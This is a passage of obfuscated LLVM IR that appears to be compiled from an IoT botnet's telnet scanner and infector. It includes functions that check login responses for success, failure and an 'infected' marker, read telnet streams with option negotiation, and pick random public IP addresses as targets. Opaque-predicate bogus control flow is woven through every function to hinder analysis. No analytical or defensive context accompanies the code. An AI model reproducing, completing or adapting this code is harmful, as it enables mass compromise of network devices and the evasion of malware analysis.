  call void @advance_state(%struct.telstate_t* %23, i32 0)
  %24 = load %struct.telstate_t*, %struct.telstate_t** %22, align 8
  %25 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %24, i32 0, i32 3
  store i8 1, i8* %25, align 1
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_infectmessage(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([1 x i8*], [1 x i8*]* @infected, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %280, %8
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  br i1 %37, label %38, label %48

; <label>:38:                                     ; preds = %33
  %39 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %40 = load i64, i64* %39, align 8
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %46, label %42

; <label>:42:                                     ; preds = %38
  %43 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %44 = load i64, i64* %43, align 8
  %45 = icmp sgt i64 %44, 0
  br label %46

; <label>:46:                                     ; preds = %42, %38
  %47 = phi i1 [ true, %38 ], [ %45, %42 ]
  br label %48

; <label>:48:                                     ; preds = %46, %33
  %49 = phi i1 [ false, %33 ], [ %47, %46 ]
  %50 = load i32, i32* @x.73
  %51 = load i32, i32* @y.74
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %48
  %58 = load i32, i32* @x.73
  %59 = load i32, i32* @y.74
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %49, label %66, label %281

; <label>:66:                                     ; preds = %originalBBpart2
  br label %67

; <label>:67:                                     ; preds = %66
  %68 = load i32, i32* @x.73
  %69 = load i32, i32* @y.74
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %77 = getelementptr inbounds [16 x i64], [16 x i64]* %76, i64 0, i64 0
  %78 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %77) #5, !srcloc !5
  %79 = extractvalue { i64, i64* } %78, 0
  %80 = extractvalue { i64, i64* } %78, 1
  %81 = trunc i64 %79 to i32
  store i32 %81, i32* %24, align 4
  %82 = ptrtoint i64* %80 to i64
  %83 = trunc i64 %82 to i32
  store i32 %83, i32* %25, align 4
  %84 = load i32, i32* @x.73
  %85 = load i32, i32* @y.74
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %92

; <label>:92:                                     ; preds = %originalBBpart24
  %93 = load i32, i32* @x.73
  %94 = load i32, i32* @y.74
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %92
  %101 = load i32, i32* %10, align 4
  %102 = srem i32 %101, 64
  %103 = zext i32 %102 to i64
  %104 = shl i64 1, %103
  %105 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %106 = load i32, i32* %10, align 4
  %107 = sdiv i32 %106, 64
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [16 x i64], [16 x i64]* %105, i64 0, i64 %108
  %110 = load i64, i64* %109, align 8
  %111 = or i64 %110, %104
  store i64 %111, i64* %109, align 8
  %112 = load i32, i32* %10, align 4
  %113 = add nsw i32 %112, 1
  %114 = call i32 @select(i32 %113, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %115 = icmp slt i32 %114, 1
  %116 = load i32, i32* @x.73
  %117 = load i32, i32* @y.74
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart231, label %originalBB6alteredBB

originalBBpart231:                                ; preds = %originalBB6
  br i1 %115, label %124, label %125

; <label>:124:                                    ; preds = %originalBBpart231
  br label %281

; <label>:125:                                    ; preds = %originalBBpart231
  %126 = load i8*, i8** %15, align 8
  %127 = load i32, i32* %18, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds i8, i8* %126, i64 %128
  store i8* %129, i8** %23, align 8
  %130 = load i32, i32* %10, align 4
  %131 = load i8*, i8** %23, align 8
  %132 = call i64 @recv(i32 %130, i8* %131, i64 1, i32 0)
  %133 = trunc i64 %132 to i32
  store i32 %133, i32* %19, align 4
  %134 = load i32, i32* %19, align 4
  %135 = icmp eq i32 %134, -1
  br i1 %135, label %155, label %136

; <label>:136:                                    ; preds = %125
  %137 = load i32, i32* @x.73
  %138 = load i32, i32* @y.74
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %136
  %145 = load i32, i32* %19, align 4
  %146 = icmp eq i32 %145, 0
  %147 = load i32, i32* @x.73
  %148 = load i32, i32* @y.74
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %146, label %155, label %156

; <label>:155:                                    ; preds = %originalBBpart235, %125
  store i32 0, i32* %9, align 4
  br label %286

; <label>:156:                                    ; preds = %originalBBpart235
  %157 = load i32, i32* %19, align 4
  %158 = load i32, i32* %18, align 4
  %159 = add nsw i32 %158, %157
  store i32 %159, i32* %18, align 4
  %160 = load i8*, i8** %23, align 8
  %161 = load i8, i8* %160, align 1
  %162 = zext i8 %161 to i32
  %163 = icmp eq i32 %162, 255
  br i1 %163, label %164, label %218

; <label>:164:                                    ; preds = %156
  %165 = load i32, i32* %10, align 4
  %166 = load i8*, i8** %23, align 8
  %167 = getelementptr inbounds i8, i8* %166, i64 1
  %168 = call i64 @recv(i32 %165, i8* %167, i64 2, i32 0)
  %169 = trunc i64 %168 to i32
  store i32 %169, i32* %19, align 4
  %170 = load i32, i32* %19, align 4
  %171 = icmp eq i32 %170, -1
  br i1 %171, label %175, label %172

; <label>:172:                                    ; preds = %164
  %173 = load i32, i32* %19, align 4
  %174 = icmp eq i32 %173, 0
  br i1 %174, label %175, label %176

; <label>:175:                                    ; preds = %172, %164
  store i32 0, i32* %9, align 4
  br label %286

; <label>:176:                                    ; preds = %172
  %177 = load i32, i32* @x.73
  %178 = load i32, i32* @y.74
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %176
  %185 = load i32, i32* %19, align 4
  %186 = load i32, i32* %18, align 4
  %187 = add nsw i32 %186, %185
  store i32 %187, i32* %18, align 4
  %188 = load i32, i32* %10, align 4
  %189 = load i8*, i8** %23, align 8
  %190 = call i32 @negotiate(i32 %188, i8* %189, i32 3)
  %191 = icmp ne i32 %190, 0
  %192 = load i32, i32* @x.73
  %193 = load i32, i32* @y.74
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart245, label %originalBB37alteredBB

originalBBpart245:                                ; preds = %originalBB37
  br i1 %191, label %201, label %200

; <label>:200:                                    ; preds = %originalBBpart245
  store i32 0, i32* %9, align 4
  br label %286

; <label>:201:                                    ; preds = %originalBBpart245
  %202 = load i32, i32* @x.73
  %203 = load i32, i32* @y.74
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %201
  %210 = load i32, i32* @x.73
  %211 = load i32, i32* @y.74
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %280

; <label>:218:                                    ; preds = %156
  %219 = load i32, i32* @x.73
  %220 = load i32, i32* @y.74
  %221 = sub i32 %219, 1
  %222 = mul i32 %219, %221
  %223 = urem i32 %222, 2
  %224 = icmp eq i32 %223, 0
  %225 = icmp slt i32 %220, 10
  %226 = or i1 %224, %225
  br i1 %226, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %218
  %227 = load i8*, i8** %15, align 8
  %228 = load i8*, i8** %11, align 8
  %229 = call i8* @strstr(i8* %227, i8* %228) #10
  %230 = icmp ne i8* %229, null
  %231 = load i32, i32* @x.73
  %232 = load i32, i32* @y.74
  %233 = sub i32 %231, 1
  %234 = mul i32 %231, %233
  %235 = urem i32 %234, 2
  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %230, label %262, label %239

; <label>:239:                                    ; preds = %originalBBpart253
  %240 = load i32, i32* %12, align 4
  %241 = icmp ne i32 %240, 0
  br i1 %241, label %242, label %279

; <label>:242:                                    ; preds = %239
  %243 = load i32, i32* @x.73
  %244 = load i32, i32* @y.74
  %245 = sub i32 %243, 1
  %246 = mul i32 %243, %245
  %247 = urem i32 %246, 2
  %248 = icmp eq i32 %247, 0
  %249 = icmp slt i32 %244, 10
  %250 = or i1 %248, %249
  br i1 %250, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %242
  %251 = load i8*, i8** %15, align 8
  %252 = call i32 @matchPrompt(i8* %251)
  %253 = icmp ne i32 %252, 0
  %254 = load i32, i32* @x.73
  %255 = load i32, i32* @y.74
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart257, label %originalBB55alteredBB

originalBBpart257:                                ; preds = %originalBB55
  br i1 %253, label %262, label %279

; <label>:262:                                    ; preds = %originalBBpart257, %originalBBpart253
  %263 = load i32, i32* @x.73
  %264 = load i32, i32* @y.74
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBB59, label %originalBB59alteredBB

originalBB59:                                     ; preds = %originalBB59alteredBB, %262
  store i32 1, i32* %20, align 4
  %271 = load i32, i32* @x.73
  %272 = load i32, i32* @y.74
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBBpart261, label %originalBB59alteredBB

originalBBpart261:                                ; preds = %originalBB59
  br label %281

; <label>:279:                                    ; preds = %originalBBpart257, %239
  br label %280

; <label>:280:                                    ; preds = %279, %originalBBpart249
  br label %33

; <label>:281:                                    ; preds = %originalBBpart261, %124, %originalBBpart2
  %282 = load i32, i32* %20, align 4
  %283 = icmp ne i32 %282, 0
  br i1 %283, label %284, label %285

; <label>:284:                                    ; preds = %281
  store i32 1, i32* %9, align 4
  br label %286

; <label>:285:                                    ; preds = %281
  store i32 0, i32* %9, align 4
  br label %286

; <label>:286:                                    ; preds = %285, %284, %200, %175, %155
  %287 = load i32, i32* %9, align 4
  ret i32 %287

originalBBalteredBB:                              ; preds = %originalBB, %48
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %67
  %288 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %289 = getelementptr inbounds [16 x i64], [16 x i64]* %288, i64 0, i64 0
  %290 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %289) #5, !srcloc !5
  %291 = extractvalue { i64, i64* } %290, 0
  %292 = extractvalue { i64, i64* } %290, 1
  %293 = trunc i64 %291 to i32
  store i32 %293, i32* %24, align 4
  %294 = ptrtoint i64* %292 to i64
  %295 = trunc i64 %294 to i32
  store i32 %295, i32* %25, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %92
  %296 = load i32, i32* %10, align 4
  %_ = shl i32 %296, 64
  %_7 = sub i32 0, %296
  %gen = add i32 %_7, 64
  %_8 = shl i32 %296, 64
  %_9 = sub i32 0, %296
  %gen10 = add i32 %_9, 64
  %297 = srem i32 %296, 64
  %298 = zext i32 %297 to i64
  %_11 = shl i64 1, %298
  %299 = shl i64 1, %298
  %300 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %301 = load i32, i32* %10, align 4
  %_12 = sub i32 %301, 64
  %gen13 = mul i32 %_12, 64
  %_14 = sub i32 %301, 64
  %gen15 = mul i32 %_14, 64
  %_16 = sub i32 0, %301
  %gen17 = add i32 %_16, 64
  %302 = sdiv i32 %301, 64
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds [16 x i64], [16 x i64]* %300, i64 0, i64 %303
  %305 = load i64, i64* %304, align 8
  %_18 = shl i64 %305, %299
  %_19 = sub i64 0, %305
  %gen20 = add i64 %_19, %299
  %_21 = shl i64 %305, %299
  %306 = or i64 %305, %299
  store i64 %306, i64* %304, align 8
  %307 = load i32, i32* %10, align 4
  %_22 = sub i32 %307, 1
  %gen23 = mul i32 %_22, 1
  %_24 = sub i32 0, %307
  %gen25 = add i32 %_24, 1
  %_26 = sub i32 0, %307
  %gen27 = add i32 %_26, 1
  %_28 = sub i32 %307, 1
  %gen29 = mul i32 %_28, 1
  %308 = add nsw i32 %307, 1
  %309 = call i32 @select(i32 %308, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %310 = icmp slt i32 %309, 1
  br label %originalBB6

originalBB33alteredBB:                            ; preds = %originalBB33, %136
  %311 = load i32, i32* %19, align 4
  %312 = icmp eq i32 %311, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %176
  %313 = load i32, i32* %19, align 4
  %314 = load i32, i32* %18, align 4
  %_38 = sub i32 0, %314
  %gen39 = add i32 %_38, %313
  %_40 = sub i32 %314, %313
  %gen41 = mul i32 %_40, %313
  %_42 = sub i32 %314, %313
  %gen43 = mul i32 %_42, %313
  %315 = add nsw i32 %314, %313
  store i32 %315, i32* %18, align 4
  %316 = load i32, i32* %10, align 4
  %317 = load i8*, i8** %23, align 8
  %318 = call i32 @negotiate(i32 %316, i8* %317, i32 3)
  %319 = icmp ne i32 %318, 0
  br label %originalBB37

originalBB47alteredBB:                            ; preds = %originalBB47, %201
  br label %originalBB47

originalBB51alteredBB:                            ; preds = %originalBB51, %218
  %320 = load i8*, i8** %15, align 8
  %321 = load i8*, i8** %11, align 8
  %322 = call i8* @strstr(i8* %320, i8* %321) #10
  %323 = icmp ne i8* %322, null
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %242
  %324 = load i8*, i8** %15, align 8
  %325 = call i32 @matchPrompt(i8* %324)
  %326 = icmp ne i32 %325, 0
  br label %originalBB55

originalBB59alteredBB:                            ; preds = %originalBB59, %262
  store i32 1, i32* %20, align 4
  br label %originalBB59
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %3 = call i32 @rand() #5
  %4 = srem i32 %3, 255
  %5 = trunc i32 %4 to i8
  store i8 %5, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %6 = call i32 @rand() #5
  %7 = srem i32 %6, 255
  %8 = trunc i32 %7 to i8
  store i8 %8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %9 = call i32 @rand() #5
  %10 = srem i32 %9, 255
  %11 = trunc i32 %10 to i8
  store i8 %11, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %12 = call i32 @rand() #5
  %13 = srem i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %15 = call i32 @rand() #5
  %16 = srem i32 %15, 152
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %42

; <label>:19:                                     ; preds = %0
  %20 = load i32, i32* @x.75
  %21 = load i32, i32* @y.76
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %29 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %30 = zext i8 %29 to i32
  %31 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %32 = zext i8 %31 to i32
  %33 = call i32 (i8*, i8*, ...) @szprintf(i8* %28, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i32 0, i32 0), i32 %30, i32 %32)
  %34 = load i32, i32* @x.75
  %35 = load i32, i32* @y.76
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %42

; <label>:42:                                     ; preds = %originalBBpart2, %0
  %43 = load i32, i32* @x.75
  %44 = load i32, i32* @y.76
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %42
  %51 = load i32, i32* %1, align 4
  %52 = icmp eq i32 %51, 1
  %53 = load i32, i32* @x.75
  %54 = load i32, i32* @y.76
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %52, label %61, label %68

; <label>:61:                                     ; preds = %originalBBpart24
  %62 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %63 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %64 = zext i8 %63 to i32
  %65 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 (i8*, i8*, ...) @szprintf(i8* %62, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.43, i32 0, i32 0), i32 %64, i32 %66)
  br label %68

; <label>:68:                                     ; preds = %61, %originalBBpart24
  %69 = load i32, i32* @x.75
  %70 = load i32, i32* @y.76
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i32, i32* %1, align 4
  %78 = icmp eq i32 %77, 2
  %79 = load i32, i32* @x.75
  %80 = load i32, i32* @y.76
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %78, label %87, label %94

; <label>:87:                                     ; preds = %originalBBpart28
  %88 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %89 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %90 = zext i8 %89 to i32
  %91 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %92 = zext i8 %91 to i32
  %93 = call i32 (i8*, i8*, ...) @szprintf(i8* %88, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i32 0, i32 0), i32 %90, i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %originalBBpart28
  %95 = load i32, i32* %1, align 4
  %96 = icmp eq i32 %95, 3
  br i1 %96, label %97, label %104

; <label>:97:                                     ; preds = %94
  %98 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %99 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %100 = zext i8 %99 to i32
  %101 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %102 = zext i8 %101 to i32
  %103 = call i32 (i8*, i8*, ...) @szprintf(i8* %98, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.45, i32 0, i32 0), i32 %100, i32 %102)
  br label %104

; <label>:104:                                    ; preds = %97, %94
  %105 = load i32, i32* %1, align 4
  %106 = icmp eq i32 %105, 4
  br i1 %106, label %107, label %114

; <label>:107:                                    ; preds = %104
  %108 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %109 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %110 = zext i8 %109 to i32
  %111 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %112 = zext i8 %111 to i32
  %113 = call i32 (i8*, i8*, ...) @szprintf(i8* %108, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.46, i32 0, i32 0), i32 %110, i32 %112)
  br label %114

; <label>:114:                                    ; preds = %107, %104
  %115 = load i32, i32* @x.75
  %116 = load i32, i32* @y.76
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %114
  %123 = load i32, i32* %1, align 4
  %124 = icmp eq i32 %123, 5
  %125 = load i32, i32* @x.75
  %126 = load i32, i32* @y.76
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %124, label %133, label %140

; <label>:133:                                    ; preds = %originalBBpart212
  %134 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %135 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %136 = zext i8 %135 to i32
  %137 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %138 = zext i8 %137 to i32
  %139 = call i32 (i8*, i8*, ...) @szprintf(i8* %134, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.47, i32 0, i32 0), i32 %136, i32 %138)
  br label %140

; <label>:140:                                    ; preds = %133, %originalBBpart212
  %141 = load i32, i32* %1, align 4
  %142 = icmp eq i32 %141, 6
  br i1 %142, label %143, label %150

; <label>:143:                                    ; preds = %140
  %144 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
